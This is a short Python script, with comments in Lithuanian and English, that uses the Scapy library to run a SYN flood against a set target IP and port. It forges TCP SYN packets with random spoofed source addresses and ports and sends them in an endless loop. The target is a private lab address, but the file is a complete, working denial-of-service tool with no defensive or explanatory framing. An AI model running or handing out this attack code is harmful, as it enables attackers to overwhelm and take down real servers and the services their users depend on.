from scapy.all import *


# Aukos IP adresas bei Port'as / Set your target IP and Port
target_ip = "10.0.2.5"
target_port = 80

def syn_flood(target_ip, target_port):

    # Atsitiktinio IP adreso bei Porto sugeneravimas / Generate random source IP address and Port number
    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    src_port = random.randint(1024, 65535)
       
    # Paketo sukurimas / Create the packet
    ip_packet = IP(src=src_ip, dst=target_ip)
    tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")
    packet = ip_packet / tcp_packet
        
    # Paketo issiuntimas / Send the packet
    send(packet, verbose=0)

while True:
     syn_flood(target_ip, target_port)
